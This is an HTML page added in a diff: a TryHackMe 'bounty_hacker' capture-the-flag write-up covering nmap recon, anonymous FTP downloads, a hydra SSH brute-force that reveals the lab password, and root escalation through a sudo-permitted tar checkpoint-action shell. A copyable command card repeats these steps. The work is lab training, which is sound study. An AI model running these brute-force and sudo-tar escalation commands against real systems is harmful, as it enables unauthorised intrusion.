@@ -1,0 +1,308 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CowboyHacker (TryHackMe) — Writeup | CyberSeeker</title>
+  <meta name="description" content="TryHackMe CowboyHacker / bounty_hacker writeup — notes, commands, screenshots, and lessons."/>
+  <style>
+    :root{
+      --bg:#07130b;
+      --panel:#0e2a1f;
+      --accent:#2aa876;
+      --muted:#9bd6b3;
+      --text:#e6f6ee;
+      --code-bg:#052017;
+      --card-radius:12px;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    html,body{height:100%;}
+    body{
+      margin:0;
+      background:linear-gradient(180deg,var(--bg),#062117 80%);
+      color:var(--text);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      padding:36px;
+      line-height:1.5;
+    }
+    .container{
+      max-width:980px;
+      margin:0 auto;
+    }
+    header{
+      display:flex;
+      gap:18px;
+      align-items:center;
+      margin-bottom:22px;
+    }
+    .logo{
+      width:72px;
+      height:72px;
+      border-radius:12px;
+      background:linear-gradient(135deg,var(--accent),#1b6f4e);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:800;
+      color:var(--bg);
+      box-shadow:0 6px 18px rgba(15,30,20,0.6);
+      font-size:22px;
+    }
+    h1{margin:0;font-size:28px;}
+    .meta{color:var(--muted);margin-top:6px;font-size:14px;}
+    .card{
+      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.04));
+      border-radius:var(--card-radius);
+      padding:18px;
+      margin-bottom:18px;
+      box-shadow:0 8px 30px rgba(4,10,6,0.45);
+      border:1px solid rgba(43,108,87,0.07);
+    }
+    nav.toc{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;}
+    nav.toc a{
+      color:var(--muted);
+      text-decoration:none;
+      background:rgba(255,255,255,0.02);
+      padding:8px 10px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.02);
+      font-size:13px;
+    }
+    section h2{
+      font-size:18px;
+      color:var(--accent);
+      margin-top:6px;
+    }
+    pre{
+      background:var(--code-bg);
+      padding:12px;
+      border-radius:10px;
+      overflow:auto;
+      font-family: "Source Code Pro", ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
+      font-size:13px;
+      border:1px solid rgba(0,0,0,0.2);
+    }
+    code{color:var(--text);}
+    .img-wrap{
+      margin:12px 0;
+      border-radius:8px;
+      overflow:hidden;
+      border:1px solid rgba(255,255,255,0.03);
+      background:#03120d;
+      padding:8px;
+    }
+    img.screenshot{max-width:100%;height:auto;display:block;border-radius:6px;}
+    .commands{
+      display:flex;
+      gap:12px;
+      flex-wrap:wrap;
+      margin:12px 0 18px;
+    }
+    .cmd-card{
+      background:#0b2a1f;
+      padding:12px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.03);
+      min-width:260px;
+      box-shadow:0 6px 12px rgba(0,0,0,0.5);
+    }
+    footer{margin-top:26px;color:var(--muted);font-size:13px;}
+    .tag{display:inline-block;background:rgba(42,168,118,0.12);color:var(--muted);padding:6px 8px;border-radius:8px;margin-right:8px;font-size:12px;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div class="logo">CS</div>
+      <div>
+        <h1>CowboyHacker (TryHackMe) — bounty_hacker</h1>
+        <div class="meta">Writeup · Recon → Exploitation → Privilege Escalation · by <strong>Svfear</strong></div>
+      </div>
+    </header>
+
+    <div class="card">
+      <nav class="toc">
+        <a href="#nmap">Nmap</a>
+        <a href="#results">Results</a>
+        <a href="#ftp">FTP</a>
+        <a href="#hydra">Brute-force (hydra)</a>
+        <a href="#ssh">SSH & user</a>
+        <a href="#priv-esc">Privilege Escalation</a>
+        <a href="#root">Root</a>
+        <a href="#references">References</a>
+      </nav>
+
+      <div style="margin-top:8px;color:var(--muted);font-size:14px;">
+        Quick summary: found anonymous FTP with file list, retrieved a wordlist & hint leading to password brute-force, obtained SSH access for <code>lin</code>, discovered sudo permission for <code>/bin/tar</code>, used gtfobins technique to get root shell.
+      </div>
+    </div>
+
+    <section id="nmap" class="card">
+      <h2>Nmap</h2>
+      <p>I ran a full service scan with default scripts and version detection:</p>
+
+      <pre><code>nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker</code></pre>
+
+      <p>Screenshot (from notes):</p>
+      <div class="img-wrap">
+        <!-- Upload this file to /assets/cowboyhacker/ and keep the filename -->
+        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024215534.png" alt="nmap screenshot">
+      </div>
+    </section>
+
+    <section id="results" class="card">
+      <h2>Results</h2>
+      <p>Port/service summary from Nmap:</p>
+      <pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.2.54.226
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+      <p><strong>Key findings:</strong> FTP (21) with anonymous access, SSH (22), HTTP (80). I checked the website and it only contained an image — so I moved to FTP enumeration.</p>
+    </section>
+
+    <section id="ftp" class="card">
+      <h2>Enumerate FTP</h2>
+      <p>Connect and list files:</p>
+      <pre><code>ftp 10.10.16.96
+Connected to 10.10.16.96.
+220 (vsFTPd 3.0.5)
+Name (10.10.16.96:svfear): anonymous
+</code></pre>
+
+      <p>Directory listing showed two interesting files:</p>
+      <pre><code>-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+</code></pre>
+
+      <p>I downloaded both:</p>
+      <pre><code>ftp> get locks.txt
+ftp> get task.txt
+</code></pre>
+
+      <div class="img-wrap">
+        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024221033.png" alt="ftp listing screenshot">
+      </div>
+
+      <p>Notes: <em>task.txt</em> contained <code>lin</code> (interpreted as a username) and <em>locks.txt</em> looked like a password wordlist — so I tried an SSH brute-force.</p>
+    </section>
+
+    <section id="hydra" class="card">
+      <h2>Hydra — brute force SSH</h2>
+      <p>Used <code>hydra</code> with <code>lin</code> and the retrieved wordlist:</p>
+      <pre><code>hydra -l lin -P locks.txt 10.10.16.96 ssh</code></pre>
+
+      <div class="img-wrap">
+        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024221639.png" alt="hydra screenshot">
+      </div>
+
+      <p><strong>Result:</strong> Password found — <code>RedDr4gonSynd1cat3</code></p>
+    </section>
+
+    <section id="ssh" class="card">
+      <h2>SSH access — user lin</h2>
+      <p>Login and check files:</p>
+      <pre><code>ssh lin@10.10.16.96
+lin@ip-10-10-16-96:~/Desktop$ ls
+user.txt
+</code></pre>
+
+      <p>Obtained <code>user.txt</code> on the Desktop.</p>
+    </section>
+
+    <section id="priv-esc" class="card">
+      <h2>Privilege Escalation</h2>
+      <p>Check sudo permissions:</p>
+      <pre><code>sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-10-16-96:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-16-96:
+    (root) /bin/tar
+</code></pre>
+
+      <p>That means <code>lin</code> can run <code>/bin/tar</code> as root. I checked <a href="https://gtfobins.github.io">GTFOBins</a> for <code>tar</code> and used the known technique to spawn a shell as root:</p>
+      <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+
+      <div class="img-wrap">
+        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024222900.png" alt="root shell via tar screenshot">
+      </div>
+
+      <p>After that I changed directory to <code>/root</code> and listed files.</p>
+    </section>
+
+    <section id="root" class="card">
+      <h2>Root</h2>
+      <pre><code># cd /root
+# ls
+root.txt  snap
+</code></pre>
+
+      <div class="img-wrap">
+        <img class="screenshot" src="/assets/cowboyhacker/Pasted image 20251024223637.png" alt="root.txt screenshot">
+      </div>
+
+      <p>Root flag located at <code>/root/root.txt</code>.</p>
+    </section>
+
+    <section class="card">
+      <h2>Command Card (copyable)</h2>
+      <div class="commands">
+        <div class="cmd-card">
+          <strong>Scanning</strong>
+          <pre><code>nmap -sV -sS -sC 10.10.16.96 -oA bounty_hacker</code></pre>
+        </div>
+        <div class="cmd-card">
+          <strong>FTP</strong>
+          <pre><code>ftp 10.10.16.96
+get locks.txt
+get task.txt</code></pre>
+        </div>
+        <div class="cmd-card">
+          <strong>Hydra (SSH)</strong>
+          <pre><code>hydra -l lin -P locks.txt 10.10.16.96 ssh</code></pre>
+        </div>
+        <div class="cmd-card">
+          <strong>Priv-esc</strong>
+          <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <section id="references" class="card">
+      <h2>References & notes</h2>
+      <ul>
+        <li>GTFOBins — tar: spawn shell with tar checkpoint action.</li>
+        <li>vsftpd 3.0.5 — anonymous FTP allowed (downloadable files).</li>
+        <li>Keep screenshots in <code>/assets/cowboyhacker/</code> and ensure filenames match those in the post.</li>
+      </ul>
+    </section>
+
+    <footer>
+      <span class="tag">TryHackMe</span>
+      <span class="tag">HTB-style workflow</span>
+      <span class="tag">priv-esc</span>
+      <div style="margin-top:12px;">Posted by <strong>Svfear</strong> · Documented steps + commands for replication. Remove any sensitive content before publishing if needed.</div>
+    </footer>
+  </div>
+</body>
+</html>
